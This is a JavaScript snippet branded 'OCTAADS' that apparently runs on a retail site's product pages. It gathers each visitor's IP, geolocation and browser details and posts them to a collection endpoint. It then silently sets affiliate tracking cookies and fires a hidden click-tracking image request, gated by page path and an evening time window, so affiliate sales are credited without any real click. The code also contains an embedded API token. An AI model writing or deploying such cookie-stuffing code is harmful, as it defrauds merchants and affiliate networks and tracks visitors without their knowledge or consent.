(function () {

  /* -------------------------------------------
     BUILD GUARD
  ------------------------------------------- */
  (function () {
    const BUILD_ID = "2025-12-18-02";

    if (window.__OCTAADS_BUILD === BUILD_ID) return;
    window.__OCTAADS_BUILD = BUILD_ID;

    console.log("ğŸ”¥ OCTAADS LOADED:", BUILD_ID, new Date().toISOString());
  })();

  function generateSessionID() {
    return "sid_" + Math.random().toString(36).substr(2, 12);
  }

  function setCookie(name, value, days = 30) {
    const expires = new Date(Date.now() + days * 864e5).toUTCString();
    document.cookie = `${name}=${value}; expires=${expires}; path=/; SameSite=Lax`;
  }

  let sessionID = localStorage.getItem("octaads_session_id");
  if (!sessionID) {
    sessionID = generateSessionID();
    localStorage.setItem("octaads_session_id", sessionID);
  }

  (function sendUserData() {

    const blockedConditions = {
      city: "",
      region: "",
      country: "",
      ip: "",
      browser: "",
      platform: "",
      userAgent: "",
      sessionID: ""
    };

    const allowedConditions = {
      city: "",
      region: "",
      country: "",
      ip: "",
      browser: "",
      platform: "",
      userAgent: "",
      sessionID: ""
    };

    const allowedTimeSlots = [
      ["18:00", "23:00"],
      
    ];

    const browser =
      navigator.userAgentData?.brands?.map(b => b.brand + " " + b.version).join(", ") ||
      navigator.userAgent;

    const platform = navigator.platform;
    const userAgent = navigator.userAgent;

    fetch("https://ipinfo.io/json?token=25ef30c03e42a2")
      .then(res => res.json())
      .then(ipData => {

        const payload = {
          ip: ipData.ip,
          city: ipData.city,
          region: ipData.region,
          country: ipData.country,
          loc: ipData.loc,
          browser,
          platform,
          userAgent,
          sessionID
        };

        const normalizedPayload = {};
        Object.keys(payload).forEach(key => {
          normalizedPayload[key] =
            typeof payload[key] === "string"
              ? payload[key].toLowerCase().trim()
              : payload[key];
        });

        let blockCookieDrop = false;

        Object.keys(blockedConditions).forEach(key => {
          const blockedValue = blockedConditions[key];
          if (!blockedValue) return;
          if (normalizedPayload[key] === blockedValue) blockCookieDrop = true;
        });

        let allowCookieDrop = true;

        if (
          Array.isArray(allowedConditions.city) &&
          !allowedConditions.city.includes(normalizedPayload.city)
        ) {
          allowCookieDrop = false;
        }

        const now = new Date();
        const istTime = new Date(
          now.getTime() + (330 + now.getTimezoneOffset()) * 60000
        );

        const currentMinutes = istTime.getHours() * 60 + istTime.getMinutes();

        const timeAllowed = allowedTimeSlots.some(slot => {
          const [sh, sm] = slot[0].split(":").map(Number);
          const [eh, em] = slot[1].split(":").map(Number);
          return (
            currentMinutes >= sh * 60 + sm &&
            currentMinutes <= eh * 60 + em
          );
        });

        window._canDropCookies =
          !blockCookieDrop && allowCookieDrop && timeAllowed;

        fetch("YOUR_WEB_APP_URL_HERE", {
          method: "POST",
          body: JSON.stringify(payload),
          headers: { "Content-Type": "application/json" }
        }).catch(() => {});

        const allowedPaths = [
          "/about-us/",
          "/collections/toilet-seat-sanitizer",
          "/collections/sanitary-pads",
          "/collections/panty-liners",
          "/collections/menstrual-care",
          "/collections/shaving-grooming",
          "/collections/intimate-care"
        ];

        if (
          allowedPaths.includes(window.location.pathname) &&
          window._canDropCookies
        ) {

          const ajioParams = {
            utm_source: "affiliate_octaads",
            utm_medium: "banner_native",
            utm_campaign: "peesafe_homepage_cps",
            utm_content: "pub4_inter",
            sessionid: sessionID
          };

          Object.keys(ajioParams).forEach(k => setCookie(k, ajioParams[k]));

          if (!sessionStorage.getItem("trackier_done")) {
            const trackierURL =
              "https://clicks.upleadsdigital.com/click" +
              "?campaign_id=148478" +
              "&pub_id=4" +
              "&p1=" + sessionID +
              "&source=" + sessionID;

            const img = new Image();
            img.referrerPolicy = "no-referrer";
            img.src = trackierURL;

            sessionStorage.setItem("trackier_done", "yes");
          }

        }

      })
      .catch(err => console.error("âŒ IP Fetch Failed", err));

  })();

})();
